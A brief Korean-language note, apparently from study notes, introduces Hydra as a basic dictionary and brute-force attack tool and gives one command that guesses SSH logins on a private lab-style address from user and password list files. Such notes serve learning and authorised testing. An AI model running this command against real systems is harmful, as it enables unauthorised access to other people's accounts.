# hydra
hydra는 사전대입공격, 무차별대입 공격을 쉽게하게 해주는 도구이다. 
가장 기초적인 bruteforce 공격 보조 도구라 할수있다.
``` bash
hydra -I -t 64 -T 64 -L ./user.txt -P ./test_pass.txt ssh://10.10.1.8 -v
```
